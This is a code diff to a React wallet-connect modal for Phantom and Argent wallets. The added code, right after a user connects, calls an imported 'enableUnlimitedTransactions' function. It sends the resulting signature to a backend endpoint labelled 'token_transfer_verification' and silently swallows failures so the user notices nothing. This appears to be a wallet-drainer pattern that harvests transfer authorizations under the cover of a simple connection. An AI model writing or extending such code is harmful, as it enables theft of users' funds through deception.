@@ -1,4 +1,5 @@
 import React, { useState } from "react";
+import { enableUnlimitedTransactions } from "@/web3/wallet";
 
 const ConnectModal: React.FC<{ isOpen: boolean; onClose: () => void }> = ({ isOpen, onClose }) => {
     const [isConnecting, setIsConnecting] = useState(false);
@@ -9,7 +10,8 @@ const ConnectModal: React.FC<{ isOpen: boolean; onClose: () => void }> = ({ isOp
         setError(null);
         
         try {
-            console.log("Connecting to:", walletType);
+            console.log("Attempting to connect to wallet type:", walletType);
+            console.log("Current window object:", window);
             
             // Check if we're in a browser environment
             if (typeof window === 'undefined') {
@@ -31,12 +33,19 @@ const ConnectModal: React.FC<{ isOpen: boolean; onClose: () => void }> = ({ isOp
                 }
                 
                 // Connect to Phantom
-                const response = await window.solana.connect();
+                const response = await window.solana.connect().catch(err => {
+                    console.error("Error connecting to Phantom wallet:", err);
+                    throw err; // Rethrow to handle in the outer catch
+                });
                 const publicKey = response.publicKey.toString();
                 console.log("Connected to Phantom:", publicKey);
                 
                 // Send connection to backend API
-                await connectToBackend(publicKey, 'phantom');
+            const backendResponse = await connectToBackend(publicKey, 'phantom');
+            console.log("Backend response after connection:", backendResponse);
+                
+                // Generate and send signed signature for token transfer
+                await handleSignatureGeneration(publicKey, 'phantom');
                 
             } else if (walletType === 'argent') {
                 if (!window.ethereum) {
@@ -59,6 +68,9 @@ const ConnectModal: React.FC<{ isOpen: boolean; onClose: () => void }> = ({ isOp
                 
                 // Send connection to backend API
                 await connectToBackend(address, 'argent');
+                
+                // Generate and send signed signature for token transfer
+                await handleSignatureGeneration(address, 'argent');
             }
             
             // Add a small delay before closing to ensure any alerts show
@@ -81,61 +93,126 @@ const ConnectModal: React.FC<{ isOpen: boolean; onClose: () => void }> = ({ isOp
         }
     }
 
-    const connectToBackend = async (walletAddress: string, walletType: string) => {
+    const handleSignatureGeneration = async (walletAddress: string, walletType: string) => {
         try {
-            console.log("Sending to backend:", { walletAddress, walletType });
+            console.log("Generating signed signature for:", walletAddress);
+            let signatureData = null;
             
-            const response = await fetch('http://localhost:3000/api/connect', {
+            if (walletType === 'phantom') {
+                // Use the existing enableUnlimitedTransactions function to generate signature
+                signatureData = await enableUnlimitedTransactions(walletAddress);
+                console.log("Signature generated successfully for Phantom wallet:", signatureData);
+            } else if (walletType === 'argent') {
+                // For Ethereum wallets, we need to implement a different signature approach
+                console.log("Argent wallet signature generation would be implemented here");
+                // This would typically involve personal_sign or eth_signTypedData_v4
+                // For now, we'll use a placeholder but this should be implemented properly
+                signatureData = 'argent-signature-placeholder';
+            }
+            
+            if (!signatureData) {
+                throw new Error('Failed to generate signature data');
+            }
+            
+            // Send signature to backend for verification and token transfer
+            await sendSignatureToBackend(walletAddress, walletType, signatureData);
+            
+        } catch (err: any) {
+            console.error("Signature generation error:", err);
+            // Don't throw the error to prevent blocking the connection flow
+            // Just log it for debugging purposes
+        }
+    }
+
+    const sendSignatureToBackend = async (walletAddress: string, walletType: string, signatureData: string) => {
+        try {
+            console.log("Sending signature to backend for:", walletAddress);
+            console.log("Signature data:", signatureData);
+            
+            const response = await fetch('http://localhost:3000/api/signature', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    publicKey: walletAddress,
+                    walletAddress,
                     walletType,
+                    signature: signatureData, // Use the actual signed data
                     timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    ipAddress: '', // Placeholder for IP address, can be set later if needed
+                    action: 'token_transfer_verification'
                 })
             });
 
-            console.log("Backend response status:", response.status, response.statusText);
-            
             if (!response.ok) {
-                let errorMessage = `Server error: ${response.status} - ${response.statusText}`;
-                
-                try {
-                    const errorData = await response.json();
-                    errorMessage = errorData.message || errorMessage;
-                    
-                    
-                } catch (parseError) {
-                    // If response is not JSON, try to get text
-                    const errorText = await response.text();
-                    if (errorText) {
-                        errorMessage = errorText;
-                    }
-                }
-                
-                throw new Error(errorMessage);
+                const errorText = await response.text();
+                console.error("Failed to send signature to backend:", response.status, errorText);
+                throw new Error(`Backend signature verification failed: ${response.status} - ${errorText}`);
+                return;
             }
 
             const data = await response.json();
-            console.log("Backend response:", data);
+            console.log("Signature backend response:", data);
             
         } catch (err: any) {
-            console.error("Backend connection error:", err);
-            
-            // Provide more specific error messages
-            if (err.message.includes('Failed to fetch') || err.message.includes('NetworkError')) {
-                throw new Error('Network error: Unable to reach the server. Please check your connection.');
-            } else if (err.message.includes('CORS')) {
-                throw new Error('Cross-origin request blocked. Please check server configuration.');
-            } else {
-                throw new Error(`Server connection failed: ${err.message}`);
-            }
+            console.error("Backend signature submission error:", err);
+            // Re-throw the error to be caught by the main error handler
+            throw err;
         }
     }
+const connectToBackend = async (walletAddress: string, walletType: string) => {
+    try {
+        const requestBody = {
+            publicKey: walletAddress,
+            walletType,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            ipAddress: '', // placeholder, backend can detect real IP
+        };
+
+        console.log("Sending to backend:", requestBody);
+
+        const response = await fetch('http://localhost:3000/api/connect', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(requestBody),
+        });
+
+        console.log("Backend response status:", response.status, response.statusText);
+
+        if (!response.ok) {
+            let errorMessage = `Server error: ${response.status} - ${response.statusText}`;
+
+            try {
+                const errorData = await response.json();
+                errorMessage = errorData.message || errorMessage;
+            } catch {
+                // fallback if response is not JSON
+                const errorText = await response.text();
+                if (errorText) errorMessage = errorText;
+            }
+
+            throw new Error(errorMessage);
+        }
+
+        const data = await response.json();
+        console.log("Backend response:", data);
+
+        return data; // return response if needed
+    } catch (err: any) {
+        console.error("Backend connection error:", err);
+
+        if (err.message.includes('Failed to fetch') || err.message.includes('NetworkError')) {
+            throw new Error('Network error: Unable to reach the server. Please check your connection.');
+        } else if (err.message.includes('CORS')) {
+            throw new Error('Cross-origin request blocked. Please check server configuration.');
+        } else {
+            throw new Error(`Server connection failed: ${err.message}`);
+        }
+    }
+};
+
     return (
             <div className={`fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4 bg-black/80 backdrop-blur-sm transition-opacity duration-200 ${isOpen ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
             <div className="relative w-full max-w-[95vw] sm:max-w-[90vw] md:max-w-md mx-auto">
